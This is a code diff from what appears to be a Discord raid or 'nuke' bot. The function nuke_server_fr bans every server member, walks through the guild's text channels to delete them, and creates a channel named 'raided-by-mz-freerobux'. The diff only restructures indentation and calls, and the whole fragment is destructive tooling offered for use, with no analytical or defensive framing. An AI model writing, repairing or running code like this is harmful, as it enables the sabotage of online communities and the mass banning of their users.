@@ -189,7 +189,6 @@ async def nuke_server_fr(ctx):
                     for member in all_members_list:
                         await ban(member1=member, self=None)
                                 
-                async def nukeallchannels(ctx):
                     try:
                         text_channel_list = []
                         for guild1 in bot.guilds:
@@ -205,7 +204,7 @@ async def nuke_server_fr(ctx):
                     finally:
                         None
                 
-                await nuke_channel_2(ctx)
+        await nuke_channel_2(ctx)
                 
         guild = ctx.message.guild
         newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
